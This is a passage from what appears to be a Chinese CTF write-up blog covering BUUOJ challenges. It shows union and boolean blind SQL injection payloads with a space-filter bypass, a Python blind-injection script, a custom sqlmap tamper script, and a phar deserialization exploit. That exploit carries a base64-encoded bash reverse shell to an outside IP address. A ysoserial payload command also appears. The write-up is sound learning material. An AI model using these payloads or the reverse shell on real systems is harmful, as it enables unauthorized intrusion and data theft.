wfy</span><br></pre></td></tr></table></figure></div>

<p>同理注入表、字段内容即可：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 表名</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.tables<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_schema<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> wfy_admin,wfy_comments,wfy_information</span><br><span class="line"># 字段名</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.columns<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_name<span class="operator">=</span><span class="string">&#x27;wfy_comments&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> id,text,<span class="keyword">user</span>,name,display</span><br><span class="line"># flag</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>btext<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>bid<span class="operator">=</span><span class="string">&#x27;100&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> flag&#123;We_0nly_have_2wo_choices&#125;</span><br><span class="line"># 或者</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>btext<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>buser<span class="operator">=</span><span class="string">&#x27;f1ag_is_here&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> flag&#123;We_0nly_have_2wo_choices&#125;</span><br></pre></td></tr></table></figure></div>

<p>Union关键字执行的联合查询需要其后的查询结果与前面的主查询”等长”，即字段数量一样，尽管字段不同，但数量一样可以让两者规整地列在同一张表中。字段数量不同会导致查询失败，从web服务角度来讲也是”没查询到”或”查询失败”，因此需要测试主查询的字段数量。此处的name主查询只回显了一个发送人”user”，好像标题上还显示了一个查询”id”，但我们前面就知道这个查询id会被原样打回到前端，因此大概率不是查询的结果。在无法判断字段数量的情况下可以逐个添加无用字段尝试，直至查询成功，前提是你的查询语句本身没有错。另一种方式是利用关键字 <code>order by</code> 测试字段数量：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b1;	# 查询成功</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b2;	# 查询成功</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>border<span class="operator">%</span><span class="number">0</span>bby<span class="operator">%</span><span class="number">0</span>b3;	# 查询失败，说明只查了两个字段</span><br></pre></td></tr></table></figure></div>

<p>解出后回过头看这个sql查询，这里有一个误解，传入的参数虽然是name，但放在查询中它是id，因此这里可以确定为数字型参数，因此不用考虑引号，不过单引号并没有被过滤。</p>
<p>顺带一提，这里的注释符号虽然被过滤了，但是查询语句中直接用分号结束，语句后有多余的内容是不影响前面语句的正确运行的，因此在分号存在的情况下不需要注释符。（也有可能是数字型参数name后面本来就没东西了）</p>
<hr>
<p>试试sqlmap能不能解决这个联合注入。主要需要解决空白字符替换问题，手改脚本并调用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://afbf3b0a-165f-41d3-91c9-552f8f217462.node4.buuoj.cn:81/comments.php --data=<span class="string">&quot;name=1&quot;</span> --delay=0.1 --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span> --tamper=space2special.py</span><br><span class="line"> --technique=U --flush-session -b -f --answers=<span class="string">&quot;reduce=n,keep=n&quot;</span></span><br><span class="line"> </span><br><span class="line">-&gt; web application technology: OpenResty</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: active fingerprint: MySQL &gt;= 5.5</span><br><span class="line">               comment injection fingerprint: MySQL 5.6.52</span><br><span class="line">               banner parsing fingerprint: MySQL 10.1.47</span><br><span class="line">               fork fingerprint: MariaDB</span><br><span class="line">banner: <span class="string">&#x27;10.1.47-MariaDB-0ubuntu0.18.04.1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>-f -b</code> 获取指纹信息与banner信息，<code>--answers</code> 自动回答带指定内容的询问，<code>--flush-session</code> 刷新会话（SQLmap会记录URL的注入内容，若之前成功过则直接读取，二次测试时需要刷新掉）。可以看到注入成功，成功获取指纹信息与banner。</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>本题中的name的值会被原样显示在响应页面里，但实际上他会做运算处理如 <code>1+1, 2^3</code> 等，这是引号被过滤的情况下仍然能联合注入的原因，也是下面另一种盲注思路的支撑。</p>
<p>来自另一篇WP的name盲注思路：</p>
<p>观察到 <code>name=1</code> 和 <code>name=0</code> 结果不同，且name实际上为数字型参数（<code>name=0+1</code> 与 <code>name=0+1-1</code> 结果也不同），这里就可以进行布尔盲注，利用 <code>0+(2&gt;1)</code> 或 <code>0^(2&gt;1)</code> 等句式实现布尔结果影响回显内容：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取数据库名称</span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span>); # <span class="literal">true</span></span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">96</span>); # <span class="literal">true</span>,说明数据库名第一个字母是小写字母</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(database()<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>);	# <span class="literal">true</span>,得到数据库名称,后略</span><br></pre></td></tr></table></figure></div>

<p>放一个大佬WP中的盲注脚本：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">import requests, <span class="type">time</span></span><br><span class="line"># 爆破数据库名字</span><br><span class="line">def get_schema_name(url, schema_length):</span><br><span class="line">    # chars <span class="operator">=</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789!_,~&#x27;</span></span><br><span class="line">    flag <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, schema_length <span class="operator">+</span> <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">left</span> <span class="operator">=</span> <span class="number">32</span></span><br><span class="line">        <span class="keyword">right</span> <span class="operator">=</span> <span class="number">127</span></span><br><span class="line">        mid <span class="operator">=</span> (<span class="keyword">left</span> <span class="operator">+</span> <span class="keyword">right</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        while <span class="keyword">left</span> <span class="operator">&lt;</span> <span class="keyword">right</span>:</span><br><span class="line">            data <span class="operator">=</span> &#123;<span class="string">&#x27;name&#x27;</span>:f&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="keyword">left</span> <span class="operator">=</span> mid <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">right</span> <span class="operator">=</span> mid</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            mid <span class="operator">=</span> (<span class="keyword">left</span> <span class="operator">+</span> <span class="keyword">right</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        if mid <span class="operator">=</span><span class="operator">=</span> <span class="number">32</span> <span class="keyword">or</span> mid <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">            pass</span><br><span class="line">        flag <span class="operator">+</span><span class="operator">=</span> chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"># 爆破所有表</span><br><span class="line">def get_tables(url, schema_name):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;&#123;schema_name&#125;&#x27;)&quot;</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            data<span class="operator">=</span>&#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> chr(num) <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> &quot;~&quot;:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"># 爆破关键表的列</span><br><span class="line">def get_column_by_table(url, <span class="keyword">table</span>):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;&#123;table&#125;&#x27;)&quot;</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            data <span class="operator">=</span> &#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> num <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> &quot;~&quot;:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"># 爆破关键的具体字符 username password</span><br><span class="line">def get_value(url, <span class="keyword">table</span>, <span class="operator">*</span>columns):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    c <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">column</span> <span class="keyword">in</span> columns:</span><br><span class="line">        c <span class="operator">+</span><span class="operator">=</span> <span class="keyword">column</span> <span class="operator">+</span> &quot;,&#x27;-&#x27;,&quot;</span><br><span class="line">    print(c[:<span class="number">-5</span>])</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            # 根据提示应该是id<span class="operator">=</span><span class="number">100</span>有flag</span><br><span class="line">            <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(&#123;c[:-5]&#125;))from(&#123;table&#125;)where(id=100)&quot;</span><br><span class="line">            data <span class="operator">=</span> &#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            print(data)</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> num <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # 布尔盲注</span><br><span class="line">    session <span class="operator">=</span> requests.session()</span><br><span class="line">    # 成功的标识</span><br><span class="line">    success <span class="operator">=</span> <span class="string">&#x27;好耶！&#x27;</span></span><br><span class="line">    url <span class="operator">=</span> &quot;http://234d565f-bb2c-4daf-b44c-f8a6c546a4ec.node4.buuoj.cn:81/comments.php&quot;</span><br><span class="line">    # 数据库名字 wfy</span><br><span class="line">    # get_schema_name(url<span class="operator">=</span>url,schema_length<span class="operator">=</span><span class="number">3</span>)</span><br><span class="line">    # 获取表 wfy_admin,wfy_comments,wfy_information</span><br><span class="line">    # get_tables(url<span class="operator">=</span>url, schema_name<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>)</span><br><span class="line">    # 获得列名</span><br><span class="line">    # wfy_information:title,header</span><br><span class="line">    # wfy_comments:id,text,<span class="keyword">user</span>,name,display</span><br><span class="line">    # wfy_admin:Id,username,password,cookie</span><br><span class="line">    # get_column_by_table(url<span class="operator">=</span>url,<span class="keyword">table</span><span class="operator">=</span><span class="string">&#x27;wfy_admin&#x27;</span>)</span><br><span class="line">    # 具体字段 <span class="number">100</span><span class="operator">-</span>f1ag_is_here<span class="operator">-</span>You have <span class="keyword">no</span> way <span class="keyword">to</span> <span class="keyword">get</span> my F1AG<span class="operator">-</span>flag&#123;We_0nly_have_2wo_choices&#125;</span><br><span class="line">    # get_value(url,<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p>​		像这种布尔盲注用SQLmap并不能直接解决，设置布尔盲注后直接运行似乎也没能跑通，主要问题在于过滤了空格，且可替换的选项很少，<code>%0A,%09,/**/,#</code> 等全被过滤，sqlmap提供的脚本tamper中只有随机替换空格的脚本，没法稳定解决这个WAF，看了一下脚本都是python编写，尝试自己编写一个：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># space2special.py</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    blanks = (<span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>)	<span class="comment"># 只改了这里，元组长度必须要对上，就偷懒了一下没深究细节</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>写好的脚本需要放置在sqlmap默认脚本库中 <code>/usr/share/sqlmap/tamper/</code> 下，sqlmap能自动识别其中的脚本，同时脚本的启动需要该库中的 <code>__init__.py</code> 文件，因此不推荐使用绝对路径在别处运行脚本。</p>
<p>​		另一方面布尔盲注需要对比成功与失败，一方面要设置 <code>--string</code> 参数作为”查询成功”标记，同时还需要让原始请求能够到成功的请求，原始请求包：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/comments.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure></div>

<p><code>name=1</code> 是能够查询出结果的，查询成功的标志是字符串”好耶”。</p>
<p>随后使用上述脚本运行sqlmap，最低Level即可：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt --technique B -p <span class="string">&quot;name&quot;</span> --string=<span class="string">&#x27;好耶&#x27;</span> --delay=0.1 --tamper=space2special.py -D wfy -T wfy_comments -C text --dump --<span class="built_in">where</span> <span class="string">&quot;id=100&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>成功获得flag！</p>
<hr>
<p>补一个不从文件生成HTTP请求的用于Sqlmap的payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://51dfbe4c-9dca-4359-8e23-01b1dd2a2b45.node4.buuoj.cn:81/comments.php --method=POST --data=<span class="string">&quot;name=1&quot;</span> --delay=0.1 --tamper=space2special.py --technique B -v 3 --string=<span class="string">&quot;好耶&quot;</span> --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span> --flush-session</span><br></pre></td></tr></table></figure></div>

<p>要点在于给请求加上UA，若不加UA注不出结果。</p>
<h3 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h3><p>参考：<a class="link"   href="https://blog.csdn.net/m0_64815693/article/details/127307656" >WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/&gt;|&lt;|\?|php|&quot;.urldecode(&quot;%0a&quot;).&quot;/i&quot;</span><br></pre></td></tr></table></figure></div>

<p><code>%0a</code> 表示回车</p>
<p>主要利用<a class="link"   href="https://www.cnblogs.com/CoLo/p/16786627.html" >phar反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，上传一个压缩包保存为： <code>upload/0412c29576c708cf0155e8de242169b1.jpg</code> ，如下访问进行反序列化</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class.php?file=phar://upload/0412c29576c708cf0155e8de242169b1.jpg/test.php</span><br></pre></td></tr></table></figure></div>

<p>弹shell的EXP：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;\rsystem(&#x27;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84MS42OS4yMjcuMjA0LzIzMzM0IDA+JjEnCg== | base64 -d | bash&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>

<p>这里采用base64绕过的方式进行反弹shell，实际执行的语句为：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/81.69.227.204/23334 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>%0a == \n</code> 换行符被过滤了，为了绕过前置注释符还可使用回车 <code>\r</code> </p>
<p>生成phar文件后改后缀为gif上传”test.gif”，保存为 <code>tmp/6ab7f8f0de1325b480be3294591342b5.gif</code> ，访问：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php?file=phar:<span class="comment">//upload/0412c29576c708cf0155e8de242169b1.jpg/test.php</span></span><br></pre></td></tr></table></figure></div>

<p>在本地访问时需要改为：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php?file=phar:<span class="comment">//upload/0412c29576c708cf0155e8de242169b1.jpg/test.php/test.txt</span></span><br></pre></td></tr></table></figure></div>

<p>猜测与PHP设置或版本有关系，本地测试时必须指明压缩包内的具体文件名。经反弹shell发现题目中的php版本为7.3.15。</p>
<p>更新：本地访问时和测试环境一样， 不需要额外加内容。得出两者不同的原因是之前本地测试时多加了一行 <code>$s=file_get_conotents($_get[&#39;file&#39;])</code> 导致出现了额外的报错，以及本地环境是Windows，部分测试命令无法运行导致网页无反应。</p>
<hr>
<p>解题步骤：用EXP打包phar攻击文件，更改后缀为图片格式后缀绕过上传过滤，上传文件后记录保存位置，访问 <code>class.php</code> 利用file参数调用到 <code>file_exists()</code> 函数，传入phar流并实现反序列化攻击：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:83/class.php?file=phar://tmp/daf280af792fd5b906511363ae2bc39d.gif</span><br></pre></td></tr></table></figure></div>

<p>即可成功调用phar内的攻击命令。</p>
<p>flag在 <code>/flag</code> 中，获取flag：<code>flag&#123;1c17302d-b3ae-435a-9650-005cd71630e8&#125;</code></p>
<h3 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h3><p><em>传说中的 JAVA 反序列化</em></p>
<p>JAVA 反序列化属实有点抽象了，但 BUU 本题的靶场好像炸了，之后再来做吧。</p>
<p>总之先让我研究一下 Idea 怎么导入和引用 jar 包，springboot 框架的特性与架构，ysoserial 工具的使用、JAVA-Rome 反序列化链条的分析与利用….再来做！</p>
<hr>
<h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4><p>使用 ysoserial 解题，payload：<code>java -jar ./ysoserial-all.jar ROME &#39;calc.exe&#39;</code></p>
<p>生成的 payload 经过 base64+URL 编码后传入即可：</p>
